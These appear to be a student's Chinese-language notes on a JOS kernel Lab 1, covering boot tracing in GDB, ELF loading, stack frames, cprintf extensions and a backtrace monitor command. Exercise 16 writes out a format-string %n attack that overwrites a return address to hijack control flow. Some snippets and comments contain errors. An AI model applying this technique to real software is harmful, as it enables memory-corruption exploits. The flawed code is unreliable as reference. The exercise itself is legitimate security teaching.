### Exercise 1 & 2

1. 代码段CS,数据段DS,堆栈段SS和附加段ES

2. 

   ```assembly
   [f000:fff0]    0xffff0: ljmp   $0xf000,$0xe05b 
   [f000:e05b]    0xfe05b: cmpl   $0x0,%cs:0x6ac8 #go and check a 4-byte word at address 0xf6ac8 
   [f000:e062]    0xfe062: jne    0xfd2e1 
   [f000:e066]    0xfe066: xor    %dx,%dx 
   [f000:e068]    0xfe068: mov    %dx,%ss  	#set ss to zero 
   [f000:e06a]    0xfe06a: mov    $0x7000,%esp #set %esp to 0x7000 
   [f000:e070]    0xfe070: mov    $0xf34c2,%edx 
   [f000:e076]    0xfe076: jmp    0xfd15c 
   [f000:d15c]    0xfd15c: mov    %eax,%ecx 
   [f000:d15f]    0xfd15f: cli 				# clear interrupt 禁止中断
   [f000:d160]    0xfd160: cld 				# +1/2
   [f000:d161]    0xfd161: mov    $0x8f,%eax 
   [f000:d167]    0xfd167: out    %al,$0x70 	# 累加器
   [f000:d169]    0xfd169: in     $0x71,%al 
   [f000:d16b]    0xfd16b: in     $0x92,%al 
   [f000:d16d]    0xfd16d: or     $0x2,%al 
   [f000:d16f]    0xfd16f: out    %al,$0x92 
   [f000:d171]    0xfd171: lidtw  %cs:0x6ab8 
   [f000:d177]    0xfd177: lgdtw  %cs:0x6a74 
   [f000:d17d]    0xfd17d: mov    %cr0,%eax 
   [f000:d180]    0xfd180: or     $0x1,%eax 
   [f000:d184]    0xfd184: mov    %eax,%cr0 
   [f000:d187]    0xfd187: ljmpl  $0x8,$0xfd18f
   # 至此，通过一个长跳转进入保护模式，实模式结束。
   # 首先呢，设置了ss 和 esp寄存器；然后呢，cli屏蔽了中断，cld是一个控制字符流向的命令，和后面的in out有关，暂时先不管；然后通过in out 和IO设备交互，进行一些初始化，打开A20门；然后lidtw lgdtw两条命令就是加载idtr gdtr寄存器；最后enable %cr0寄存器，进入实模式，长跳转到内核部分执行。
   ```

3. 在计算机中，大部分数据存放在主存 中，8086CPU提供了一组处理主存中连续存放的数据串的指令——串操作指令。串操作指令中，源操作数用寄存器SI寻址，默认在数据段DS中，但允许段超越；目的操作数用寄存器DI寻址，默认在附加段ES中，不允许段超越。每执行一次串操作指令，作为源地址指针的SI和作为目的地址指针的DI将自动修改：+/-1（对于字节串）或+/-2（对于字串）。地址指针时增加还是减少取决于方向标志DF。<u>在系统初始化后或者执行指令CLD指令后，DF=0,此 时地址指针增1或2；在执行指令STD后，DF=1，此时地址指针减1或2。</u>

   ```
   1、串传送指令MOVS
   MOVSB;字节串传送：ES:[DI]←DS:[SI],SI←SI+/-1,DI←DI+/-1
   MOVSW;字串传送：ES:[DI]←DS:[SI],SI←SI+/-2,DI←DI+/-2
   MOVS 目的串名，源串名；这种格式需要使用前缀WORD PTR或BYTE PTR指明
   例：将数据段SOURCE指示的100个字节数据传送到附加段DESTINATION指示的主存区
   ...
   ```

   > CLD(汇编语言指令) 
   >
   > CLD与STD是用来操作方向标志位DF（Direction Flag）。CLD使DF复位，即DF=0，STD使DF置位，即DF=1.用于串操作指令中。
   >
   > 例如：`MOVS` ( MOVe String) 串传送指令
   >
   > ​		`MOVSB` //字节串传送 DF=0, SI = SI + 1 , DI = DI + 1 ；DF = 1 , SI = SI - 1 , DI = DI - 1
   >
   > ​		`MOVSW` //字串传送 DF=0, SI = SI + 2 , DI = DI + 2 ；DF = 1 , SI = SI - 2 , DI = DI - 2 
   >
   > ​		执行操作：[DI] = [SI] ,将位于DS段的由SI所指出的存储单元的字节或字传送到位于ES段的由DI 所指出的存储单元,再修改SI和DI, 从而指向下一个元素
   >
   > ​		在执行该指令之前,必须预置SI和DI的初值,用STD或CLD设置DF值.
   >
   > ​		`MOVS DST , SRC` //同上,不常用,DST和SRC只是用来用类型检查,并不允许使用其它寻址方式来确定操作数.
   >
   > ​		1.目的串必须在附加段中,即必须是ES:[DI] 
   >
   > ​		2.源串允许使用段跨越前缀来修饰,但偏移地址必须是[SI].

4. 启动过程：

   1. 将 BIOS(ROM芯片中) 加载到内存中并执行，BIOS 初始化设备、中断程序、并从 boot 设备(硬盘)读取第一个扇区到内存中
   2. 1. boot loader 将处理器从实模式切换到32位保护模式，（仅有此模式，软件才能发文处理器地址空间中的1MB以上的所有内存）
      2. boot loader 通过x86特殊的IO指令直接访问IDE磁盘设备，从硬盘中读取内核。

   

### Exercise 3

   > 1. At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?

   在 `boot.S` 中，51行:

   ```assembly
   /* Line 10 */
   .set CR0_PE_ON,      0x1         # protected mode enable flag
   
   /* Line 50 ~ 51 */
   orl     $CR0_PE_ON, %eax
   movl    %eax, %cr0
   ```

   > 2. What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded?

   ```assembly
   /* the last instruction of the boot loader executed */
   0x7d6b:	call   *0x10018
   
   /* the first instruction of the kernel it just loaded */
   0x10000c:	movw   $0x1234,0x472 
   ```

   

   > 3. How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk?Where does it find this information?

   ```c
   /* in main.c */
   /* The kernel image must be in ELF format. */
   
   /* Line 50 ~ 56 */
   // load each program segment (ignores ph flags)
   ph = (struct Proghdr *) ((uint8_t *) ELFHDR + ELFHDR->e_phoff);
   /* e_phoff 指 kernel 第一页的偏移(字节为单位) */
   eph = ph + ELFHDR->e_phnum;
   /* e_phnum 指 kernel 多少个 */
   for (; ph < eph; ph++)
       // p_pa is the load address of this segment (as well 
       // as the physical address)
       readseg(ph->p_pa, ph->p_memsz, ph->p_offset);
   
   ```

   ```sh
   os@ubuntu:~/lab1/jos-2019-spring/obj/kern$ objdump -p kernel
   
   kernel:     file format elf32-i386
   
   Program Header:
       LOAD off    0x00001000 vaddr 0xf0100000 paddr 0x00100000 align 2**12
            filesz 0x00007916 memsz 0x00007916 flags r-x
       LOAD off    0x00009000 vaddr 0xf0108000 paddr 0x00108000 align 2**12
            filesz 0x0000b6a8 memsz 0x0000b6a8 flags rw-
      STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
            filesz 0x00000000 memsz 0x00000000 flags rwx
   
   os@ubuntu:~/lab1/jos-2019-spring/obj/kern$ readelf -h kernel
   ELF Header:
     Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
     Class:                             ELF32
     Data:                              2's complement, little endian
     Version:                           1 (current)
     OS/ABI:                            UNIX - System V
     ABI Version:                       0
     Type:                              EXEC (Executable file)
     Machine:                           Intel 80386
     Version:                           0x1
     Entry point address:               0x10000c
     Start of program headers:          52 (bytes into file)
     Start of section headers:          86884 (bytes into file)
     Flags:                             0x0
     Size of this header:               52 (bytes)
     Size of program headers:           32 (bytes)
     Number of program headers:         3
     Size of section headers:           40 (bytes)
     Number of section headers:         15
     Section header string table index: 14
     
   os@ubuntu:~/lab1/jos-2019-spring/obj/kern$ objdump -f kernel
   kernel:     file format elf32-i386
   architecture: i386, flags 0x00000112:
   EXEC_P, HAS_SYMS, D_PAGED
   start address 0x0010000c	# e_entry
   ```

   

### ebp & esp

   ```assembly
   (1) ebp 的默认段也是 SS，这方面和 esp 一样
   在处理栈变量时，它们是分工合作的：esp 负责开辟空间，ebp 负责保存上一级的栈桢:
   push ebp					; 向前赋值
   mov ebp, esp                ; 保存调用链中的上一级函数的栈桢
   sub esp, 0xc0               ; 分配本地栈变量空间
   ... ...
   mov [ebp-4], ecx            ; 使用本地栈空间
   ... ...
   mov esp, ebp                ; 恢复上一级栈桢
   pop ebp
   ret
   --------------------------
   在这里， ebp 默认是使用 SS 段的，这和 esp 是一样的！所以 ebp 才被叫做 stack-frame base pointer (栈桢基指针），目的和初衷是辅助 esp 处理栈变量的！
    (2) ebp 在处理 local 变量时，优势以及作用, esp 是不能代替的，例如，如果编译器需要将 栈对齐在 16 字节后再分配空间，那么，编译会大概会类似这样做:
   push ebp
   mov ebp, esp
   and esp, 0xfffffff0              ;; 注意，这需要对齐在 16 字节
   sub esp, 0xc0                             ;; 注意，然后再分配空间
   ... ...
   mov esp, ebp                       ;;  最后返回前，编译器并不需要记住 esp 对齐前的值
   pop ebp 
   ret
   ----------------------
   那么，如果只使用 esp 处理栈变量的话，如何方便优雅地做到 "栈对齐" 这一要求呢?
   ```

> 调用栈： https://www.jianshu.com/p/ea9fc7d2393d



### Exercise 5

   > **Exercise 5.** Reset the machine (exit QEMU/GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question.
   > Just think.)

   ```assembly
   (gdb) b *0x7c00
   Breakpoint 1 at 0x7c00
   (gdb) c Continuing.
   [   0:7c00] => 0x7c00:  cli     
   
   Breakpoint 1, 0x00007c00 in ?? ()
   (gdb) x/8x 0x00100000
   0x100000:       0x00000000      0x00000000      0x00000000      0x00000000
   0x100010:       0x00000000      0x00000000      0x00000000      0x00000000
   (gdb) b *0x7d6b
   Breakpoint 2 at 0x7d6b
   (gdb) c Continuing.
   The target architecture is assumed to be i386
   => 0x7d6b:      call   *0x10018
   
   Breakpoint 2, 0x00007d6b in ?? ()
   (gdb) x/8x 0x00100000
   0x100000:       0x1badb002      0x00000000      0xe4524ffe      0x7205c766
   0x100010:       0x34000004      0x2000b812      0x220f0011      0xc0200fd8
   
   # 不同的原因：加载了 kernel，准确来说是kernel的第一个program segment(代码段)
   (gdb) b *0x7d55
   Breakpoint 2 at 0x7d55
   (gdb) c
   Continuing.
   The target architecture is assumed to be i386
   => 0x7d55:      pushl  0x4(%ebx)
   
   Breakpoint 2, 0x00007d55 in ?? ()
   (gdb) p/x $ebx
   $1 = 0x10034
   (gdb) p/x 0x10037
   $2 = 0x10037
   (gdb) x/x 0x10037
   0x10037:        0x00100000
   (gdb) c
   Continuing.
   => 0x7d55:      pushl  0x4(%ebx)
   
   Breakpoint 2, 0x00007d55 in ?? ()
   (gdb) p/x $ebx
   $3 = 0x10054
   (gdb) x/x 0x10057
   0x10057:        0x00900000
   ```

   

### Exercise 6

   > **Exercise 6.** Trace through the first few instructions of the boot loader again and identify the first instruction that would "break" or otherwise do the wrong thing if you were to get the boot loader's link address wrong. Then change the link address in boot/Makefrag to something wrong, run make clean , recompile the lab with make , and trace into the boot loader again to see what happens. Don't forget to change the link address back and make clean afterwards!

   ```
   1. 第一条受影响的指令是：lgdt (加载GDT表)
   2. 加载地址和链接地址的区别体现在：
   	kernel的加载地址是在BIOS中(ROM)上设定的，所以kernel可以正确加载
   	但是因为修改了 `-Ttext` 链接地址，所以第一条出现问题的指令一定与link有关(符号重定位)
   ```

   ```assembly
   # -Ttext 0x8c00
   (gdb) si
   [   0:7c1c] => 0x7c1c:  out    %al,$0x60 0x00007c1c in ?? ()
   (gdb)  [   0:7c1e] => 0x7c1e:  lgdtw  -0x739c 0x00007c1e in ?? ()	# 从负地址加载GDT表
   (gdb)  [   0:7c23] => 0x7c23:  mov    %cr0,%eax 0x00007c23 in ?? ()
   (gdb)  [   0:7c26] => 0x7c26:  or     $0x1,%eax 0x00007c26 in ?? ()
   (gdb)  [   0:7c2a] => 0x7c2a:  mov    %eax,%cr0 0x00007c2a in ?? ()
   (gdb)  [   0:7c2d] => 0x7c2d:  ljmp   $0x8,$0x8c32 0x00007c2d in ?? ()
   (gdb)  [   0:7c2d] => 0x7c2d:  ljmp   $0x8,$0x8c32 0x00007c2d in ?? ()
   (gdb) 
   
   lgdt    gdtdesc
   movl    %cr0, %eax
   orl     $CR0_PE_ON, %eax
   movl    %eax, %cr0
   # Jump to next instruction, but in 32-bit code segment.
   # Switches processor into 32-bit mode.
   ljmp    $PROT_MODE_CSEG, $protcseg
   # 这里的一些常量，在一开始编译生成relocatable object file的时候，其值是不确定的，因为编译器并不知道，最后这些程序（数据）的位置；只有在链接过程中，我们敲定了代码、数据放在哪里（我们将代码段的起始位置从0x7c00改为了0x8c00),然后链接器会对这些常量进行一个替换。
   # 那么问题就来了——链接器按照0x8c00的链接起始位置对这些常量进行替换，然后BIOS还是把bootloader读到0x7c00位置的，那么冲突势必发生了
   ```

   > 关于GDT：https://zhuanlan.zhihu.com/p/25867829

   

### Exercise 7

   > **Exercise 7.** Use QEMU and GDB to trace into the JOS kernel and find where the new virtual-to-physical mapping takes effect. Then examine the Global Descriptor Table (GDT) that the code uses to achieve this effect, and make sure you understand what's going on.
   >
   > What is the first instruction after the new mapping is established that would fail to work properly if the old mapping were still in place? Comment out or otherwise intentionally break the segmentation setup code in kern/entry.S , trace into it, and see if you were right.

   ```assembly
   # 1: virtual-to-physical
   # in entry.S(Line 59 ~ 52)
   # Turn on paging.
   movl	%cr0, %eax
   orl	$(CR0_PE|CR0_PG|CR0_WP), %eax
   movl	%eax, %cr0
   
   # 2: GDT
   (gdb) si
   => 0x100025:    mov    %eax,%cr0
   0x00100025 in ?? ()
   (gdb) x/x 0xf0100000
   0xf0100000 <_start+4026531828>: 0x00000000
   (gdb) si
   => 0x100028:    mov    $0xf010002f,%eax
   0x00100028 in ?? ()
   (gdb) x/x 0xf0100000
   0xf0100000 <_start+4026531828>: 0x1badb002
   
   # 3: 在 entry.S 注释掉 1 中的三行
   (gdb)  
   => 0x100022:    jmp    *%eax 0x00100022 in ?? () 
   (gdb)  
   => 0xf0100024 <relocated>:      add    %al,(%eax)
   relocated () at kern/entry.S:74
   74              movl    $0x0,%ebp                       # nuke frame pointer 
   (gdb)   Remote connection closed (gdb)
   
   ### 
   qemu: fatal: Trying to execute code outside RAM or ROM at 0xf0100024
   ```

   

### Exercise 8

   > **Exercise 8**. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form "%o". Find and fill in this code fragment. Remember the octal number should begin with '0'.

   ```c
  // (unsigned) octal
  case 'o':
    // Replace this with your code.			
    putch('0', putdat);
    num = getuint(&ap, lflag);
    base = 8;
    goto number;
   ```

   

### Exercise 9

   > **Exercise 9.** You need also to add support for the "+" flag, which forces to precede the result with a plus or minus sign (+ or -) even for positive numbers.

   ```c
  int sign;	/* Line 100 */
  
  sign = 0;	/* Line 116 */
  
  /* Line 125 ~ 129 */
  case '+':
    sign = 1;
    goto reswitch;
    
  case 'd':
   	num = getint(&ap, lflag);
   	if ((long long) num < 0) {
           putch('-', putdat);
           num = -(long long) num;
       } else if(sign) {
           putch('+', putdat);			/* + */
       }
   	base = 10;
   	goto number;
   ```

   

  > 1. Explain the interface between printf.c and console.c . Specifically, what function does console.c export? How is this function used by printf.c ?

   ```c
   cprintf()->vcprintf()->putch()->cputchar()->...
   ```

   ​	

   > 2. Explain the following from console.c :
   >
   > ```c
   > 1 if (crt_pos >= CRT_SIZE) {
   > 2 	int i;
   > 3 	memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t)); 
   > 4 	for (i = CRT_SIZE - CRT_COLS; i < CRT_SIZE; i++)
   > 5 		crt_buf[i] = 0x0700 | ' ';
   > 6 	crt_pos -= CRT_COLS;
   > 7 }
   > 
   > if (crt_pos >= CRT_SIZE) {// 如果当前的输入光标已经超过屏幕显示的范围
   >     int i;
   >     //将当前的buf的第二行及之后的内容copy到第一行的位置（相当于屏幕内容向下滚动了一行） 		
   >     memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));
   >     //将新的空出来的一行填充为黑色
   >     for (i = CRT_SIZE - CRT_COLS; i < CRT_SIZE; i++)
   >         crt_buf[i] = 0x0700 | ' ';
   >     //将当前光标的位置减去CRT_COLS个单元（相当于光标上一一行，之前超过显示范围的光标现在位于屏幕最下方的起点处）
   >     crt_pos -= CRT_COLS;
   > }
   > ```

   ​	作用就是屏幕写满的时候，把第一行消掉，然后其他所有行上移一行，新的内容写到新的行里。

   ​	

   > 3. For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC's calling convention on the x86.
   >     Trace the execution of the following code step-by-step:
   >
   >   ```c
   >   int x = 1, y = 3, z = 4;
   >   cprintf("x %d, y %x, z %d\n", x, y, z);
   >   ```
   >
   >   - In the call to cprintf() , to what does fmt point? To what does ap point?
   >   - List (in order of execution) each call to cons_putc , va_arg , and vcprintf . For cons_putc , list its argument as well. For va_arg , list what ap points to before and after the call. For vcprintf list the values of its two arguments.

   ​	

   ```assembly
   (gdb)  
   => 0xf01000ff <i386_init+89>:   call   0xf01006ea <cons_init> 36              cons_init(); 
   (gdb)  
   => 0xf0100104 <i386_init+94>:   push   $0x4 
   38              cprintf("x %d, y %x, z %d\n", x, y, z); 
   (gdb) si 
   => 0xf0100106 <i386_init+96>:   push   $0x3 
   0xf0100106      38              cprintf("x %d, y %x, z %d\n", x, y, z); 
   (gdb)  
   => 0xf0100108 <i386_init+98>:   push   $0x1 
   0xf0100108      38              cprintf("x %d, y %x, z %d\n", x, y, z); 
   (gdb)  
   => 0xf010010a <i386_init+100>:  lea    -0xf6f1(%ebx),%eax 
   0xf010010a      38              cprintf("x %d, y %x, z %d\n", x, y, z); 
   (gdb)  
   => 0xf0100110 <i386_init+106>:  push   %eax 
   0xf0100110      38              cprintf("x %d, y %x, z %d\n", x, y, z); 
   (gdb) p/x $eax 
   $1 = 0xf0101c17 
   (gdb) si 
   => 0xf0100111 <i386_init+107>:  call   0xf0100b79 <cprintf> 
   0xf0100111      38              cprintf("x %d, y %x, z %d\n", x, y, z); 
   (gdb) si 
   => 0xf0100b79 <cprintf>:        push   %ebp  
   Breakpoint 2, cprintf (fmt=0xf0101c17 "x %d, y %x, z %d\n") at kern/printf.c:27 
   27      { 
   (gdb) x/s 0xf0101c17 
   0xf0101c17:     "x %d, y %x, z %d\n"			# fmt
   
   # ...
   
   (gdb)  
   => 0xf0100b42 <vcprintf>:       push   %ebp  
   Breakpoint 3, vcprintf (fmt=0xf0101c17 "x %d, y %x, z %d\n", ap=0xf010feb4 "\001") at kern/printf.c:18
   ```

   ​	

   ```assembly
   (gdb) b 0xf0100fed
   
   # cprtinf (fmt=0xf0101c17 "x %d, y %x, z %d\n")
   
   # vcprintf (fmt=0xf0101c17 "x %d, y %x, z %d\n", ap=0xf010feb4 "\001") at kern/printf.c:18
   
   # vprintfmt (putch=0xf0100b17 <putch>, putdat=0xf010fe7c, fmt=0xf0101c17 "x %d, y %x, z %d\n",      ap=0xf010feb4 "\001") at lib/printfmt.c:89 
   
   # cons_putc (c=120) at kern/console.c:434	# 'x'
   (gdb) p/c 120 
   $1 = 120 'x'
   
   # cons_putc (c=32) at kern/console.c:434 	# ' '
   # va_arg()	*ap: 1 -> 3
   # cons_putc (c=43) at kern/console.c:70		# '+'
   # cons_putc (c=49) at kern/console.c:70 		# '1'
   # cons_putc (c=44) at kern/console.c:70 		# ','
   # cons_putc (c=32) at kern/console.c:70 		# ' '
   # cons_putc (c=121) at kern/console.c:70		# 'y'
   # cons_putc (c=32) at kern/console.c:70 		# ' '
   
   (gdb) p/x *ap 
   $9 = 3 0x3
   # va_arg(*ap, unsigned int);
   (gdb) p/x *ap 
   $12 = 0x4
   
   # cons_putc (c=51) at kern/console.c:70 	# '3'
   # ...
   
   ## x +1, y 3, z +4
   # 由调试中可以发现，每次ap向后移动的都是下一个所需要的类型的位置。
   ```

   

   > 4. Run the following code.
   >
   > ```c
   > unsigned int i = 0x00646c72; 
   > cprintf("H%x Wo%s", 57616, &i); 
   > ```
   >
   > What is the output? Explain how this output is arrived out in the step-by-step manner of the previous exercise. 
   >
   > The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set i to in order to yield the same output? Would you need to change 57616 to a different value?

   ```sh
   ## He110 World
   ## 如果换成大端，输出就是dlr；57616则不用修改
   # 输出的结果为He110 World &i对应的byte序列从低位开始计算的72 6c 64 00真好是字符串rld 所以最终的输出结果是He110 World 如果变更高字节的，则只需要将i对应的值即0x00646c72 改为0x726c6400即可，不需要对57616，进行修改，因为此处的值（57616）是直接的数值，不是地址的值，因此不需要对57616进行修改。
   
   # "%s" 字符串指针
   ```

   

   > 5. In the following code, what is going to be printed after 'y=' ? (note: the answer is not a specific value.) Why does this happen?
   >
   >   ```c
   >   cprintf("x=%d y=%d", 3);
   >   ```

   ```sh
   x=+3 y=+16006828 
   
   # 这是未定义行为，会去读取栈中其他的数值。
   # 多次刷新，y的结果确实没有发生变化，再此印证了上面所说的事情，而为什么没有产生变化呢，就是因为每次打印出的变量的值都是根据第三题中的va_arg从ap指针不断的向后取值，得到此题目中的y的值，这是在每一个电脑上应该是不同的值，或者说，这电脑的不同的时候启动应该也不尽相同，但是在当下的一段时间内这个数值是固定的，因此，这个是存在且一段时间是固定的。
   ```

   

   > 6. Let's say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change cprintf or its interface so that it would still be possible to pass it a variable number of arguments?

   ​	需要对 va_arg 进行重新写，使得原来加上的地址，要减去



### Exercise 10

> **Exercise 10.** Enhance the cprintf function to allow it print with the %n specifier, you can consult the %n specifier specification of the C99 printf function for your reference by typing "man 3 printf" on the console. In this lab, we will use the char * type argument instead of the C99 int * argument, that is, "the number of characters written so far is stored into the signed char type integer indicated by the char * pointer argument. No argument is converted." You must deal with some special cases properly, because we are in kernel, such as when the argument is a NULL pointer, or when the char integer pointed by the argument has been overflowed. Find and fill in this code fragment.

```c
case 'n': {
    const char *null_error = "\nerror! writing through NULL pointer! (%n argument)\n";
    const char *overflow_error = "\nwarning! The value %n argument pointed to has been overflowed!\n";

    // Your code here
    // 首先将%n对应的参数以signed char指针的形式读取出来
    signed* ptr = (signed*) va_arg(ap, void *);
    if(!ptr){
        // 如果这个指针是NULL，报错
        printfmt(putch, putdat, "%s", null_error);
    } else {
        // 指针非NULL，则将当前的输入字符数量以signed char形式（1 byte）读到指针所指向的地址
        *(signed char*)ptr = *(signed char*)putdat;
        if(*(int*)putdat > 0x7F){
            // 如果输入字符数量超过0x7F（signed char能表示的最大值），报错
            printfmt(putch, putdat, "%s", overflow_error);
        }
    }
    break;
}
```



### Exercise 11

> **Exercise 11.** Modify the function printnum() in lib/printfmt.c to support "%-" when printing numbers. With the directives starting with "%-", the printed number should be left adjusted. (i.e., paddings are on the right side.) For example, the following function call:
>
> ```c
> cprintf("test:[%-5d]", 3)
> ```
>
>  , should give a result as 
>
> ```c
> "test:[3 ]" 
> ```
>
> (4 spaces after '3'). Before modifying printnum() , make sure you know what happened in function vprintffmt() .

```c
/* in printnum() */

// if cprintf'parameter includes pattern of the form "%-", padding
// space on the right side if neccesary.
// you can add helper function if needed.
// your code here:
if(padc == '-'){
    padc = ' ';
    printnum(putch,putdat,num,base,0,padc);
    while (--width > 0)
        putch(padc, putdat);
    return;
}
```



### Exercise 12

> **Exercise 12.** Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which "end" of this reserved area is the stack pointer initialized to point to?

​	

```asm
@kernel.asm

	# Clear the frame pointer register (EBP)
    # so that once we get into debugging C code,
    # stack backtraces will be terminated properly.
	movl	$0x0,%ebp			# nuke frame pointer
f010002f:	bd 00 00 00 00       	mov    $0x0,%ebp	

	# Set the stack pointer
    movl	$(bootstacktop),%esp	# esp 指向 bootstacktop ，栈顶(低地址)
f0100034:	bc 00 00 11 f0       	mov    $0xf0110000,%esp

## The x86 stack pointer ( esp register) points to the lowest location on the stack that is currently in use. Everything below that location in the region reserved for the stack is free.
```



### Exercise 13

> **Exercise 13.** To become familiar with the C calling conventions on the x86, find the address of the test_backtrace function in obj/kern/kernel.asm , set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32bit words does each recursive nesting level of test_backtrace push on the stack, and what are those words?
> Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the tools page. Otherwise, you'll have to manually translate all breakpoint and memory addresses to linear addresses.

​	

```asm
f0100095:	83 ec 0c             	sub    $0xc,%esp
f0100098:	8d 46 ff             	lea    -0x1(%esi),%eax
f010009b:	50                   	push   %eax
f010009c:	e8 9f ff ff ff       	call   f0100040 <test_backtrace>

## ...
test_backtrace(int x) {
f0100040:	55                   	push   %ebp
f0100041:	89 e5                	mov    %esp,%ebp
f0100043:	56                   	push   %esi
f0100044:	53                   	push   %ebx

# 0xc + 4 + 4 = 0x14
# $eax: 5 -> 4 -> ... -> 0
```



### Exercise 14 & 15

> **Exercise 14.** Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, run make grade to see if its output conforms to what our grading script expects, and fix it if it doesn't. After you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.
>
> 
>
> **Exercise 15.** Modify your stack backtrace function to display, for each eip , the function name, source file name, and line number corresponding to that eip .
>
> In debuginfo_eip , where do \_STAB_* come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do: 
> 
>
> - look in the file kern/kernel.ld for \__STAB\__* 
>
> - run `i386-jos-elf-objdump -h obj/kern/kernel`
>
> - run `i386-jos-elf-objdump -G obj/kern/kernel`
>
> - run `i386-jos-elf-gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern/init.c`, and look at init.s.
>
> - <u>see if the bootloader loads the symbol table in memory as part of loading the kernel binary</u> 
>
>   
>
>   Complete the implementation of `debuginfo_eip` by inserting the call to `stab_binsearch` to find the line number for an address.
>   Add a `backtrace` command to the kernel monitor, and extend your implementation of `mon_backtrace` to call `debuginfo_eip` and print a line for each stack frame of the form:
>
>   ```asm
>   K> backtrace
>   Stack backtrace:
>     eip f01008ae ebp f010ff78 args 00000001 f010ff8c 00000000 f0110580 00000000 
>     		kern/monitor.c:143 monitor+106
>     eip f0100193 ebp f010ffd8 args 00000000 00001aac 00000660 00000000 00000000 
>     		kern/init.c:49 i386_init+59
>     eip f010003d ebp f010fff8 args 00000000 00000000 0000ffff 10cf9a00 0000ffff 
>     		kern/entry.S:70 <unknown>+0
>   K> 
>   ```
>
>   Each line gives the file name and line within that file of the stack frame's `eip` , followed by the name of the function and the offset of the eip from the first instruction of the function (e.g., `monitor+106` means the return `eip` is 106 bytes past the beginning of `monitor` ).
>
>   Be sure to print the file and function names on a separate line, to avoid confusing the grading script.
>
>   You may find that the some functions are missing from the backtrace. For example, you will probably see a call to `monitor()` but not to `runcmd()` . This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of the `-O2` from `GNUMakefile` , the backtraces may make more sense (but your kernel will run more slowly).

​	

```c
int
mon_backtrace(int argc, char **argv, struct Trapframe *tf)
{
	// Your code here.
	cprintf("Stack backtrace:\n");
	uint32_t ebp = read_ebp();
	// 读取%ebp寄存器中的值，%ebp指向当前帧，（%ebp）指向上一帧
	while(ebp != 0){	// %ebp为0时函数遍历到最外层，backtrace到达终点
		uint32_t eip = *(int*)(ebp + 4);	// 读取(4(%ebp))，即%eip的值
		cprintf("  eip %08x  ebp %08x  args %08x %08x %08x %08x %08x\n",
			eip, ebp,
			*(int*)(ebp+8),*(int*)(ebp+12),*(int*)(ebp+16),*(int*)(ebp+20),*(int*)(ebp+24));
		struct Eipdebuginfo info;
		if(debuginfo_eip(eip,&info) >= 0){	// 查找%eip对应函数的相关信息
			cprintf("         %s:%d %.*s+%d\n",
				info.eip_file, info.eip_line,
				info.eip_fn_namelen, info.eip_fn_name, eip-info.eip_fn_addr);
		}
		ebp = *(int*)ebp;	// 更新ebp，下一轮循环将输出外一层函数的相关信息
	}
	overflow_me();
		cprintf("Backtrace success\n");
	return 0;
}
```

> Stab: https://blog.csdn.net/doniexun/article/details/45044015
>
> printf "%.*s":
>
> ​		小数点.后“ * ”表示输出位数，具体的数据来自参数表 printf格式字符串中，与宽度控制和精度控制有关的常量都可以换成变量，方法就是使用一个“ * ”代替那个常量，然后在后面提供变量给“ * ”。
>
>  ​		同样，小数点.前也可以添加*，也要用户输入一个位宽值来代替，表示输出的字符所占位宽。



### Exercise 16

> **Exercise 16.** Recall the buffer overflow attack in ICS Lab. Modify your start_overflow
> function to use a technique similar to the buffer overflow to invoke the do_overflow
> function. You must use the above cprintf function with the %n specifier you
> augmented in "Exercise 10" to do this job, or else you won't get the points of this
> exercise, and the do_overflow function should return normally.

​	

```c
void
start_overflow(void) {
    // You should use a techique similar to buffer overflow
    // to invoke the do_overflow function and
    // the procedure must return normally.
     // And you must use the "cprintf" function with %n specifier
    // you augmented in the "Exercise 9" to do this job.
    
     // hint: You can use the read_pretaddr function to retrieve
    //       the pointer to the function call return address;
    char str[256] = {};
    int nstr = 0;
    char *pret_addr;
    
    // Your code here.
    pret_addr = (char*)read_pretaddr();	// 读取eip所在的地址
    
    // 原本的ret addr：0xf0100ba8(overflow_me)
    cprintf("old rip: %lx\n", *(uint32_t*)pret_addr);
    cprintf("%52d%n\n",nstr, pret_addr);	// 更改 0xa8 -> 0x34
    cprintf("%10d%n\n",nstr, pret_addr+1);	// 更改 0x0b -> 0x0a
    
    // 新的ret addr: 0xf0100a34(do_overflow)
    cprintf("new rip: %lx\n", *(uint32_t*)pret_addr);
    
    //	在8(%ebp)处填入原本的ret addr，这样do_overflow才能正常return
    cprintf("%168d%n\n",nstr, pret_addr+4);	// 填入0xa8
    cprintf("%11d%n\n", nstr, pret_addr+5);	// 填入0x0b
    cprintf("%16d%n\n",nstr, pret_addr+6);	// 填入0x10
    cprintf("%240d%n\n",nstr, pret_addr+7);	// 填入0xf0
}

/*
 * 常量从kernel.asm中得到，更改代码，值可能会改变
 */
```



### Exercise 17

> Exercise 17. There is a "time" command in Linux. The command counts the program's running time.
>
> ```sh
> $time ls
> a.file b.file ...
> 
> real 0m0.002s
> user 0m0.001s
> sys 0m0.001s
> ```
>
>  In this exercise, you need to implement a rather easy "time" command. The output of the "time" is the running time (in clocks cycles) of the command. The usage of this command is like this: "time [command]".
>
> ```asm
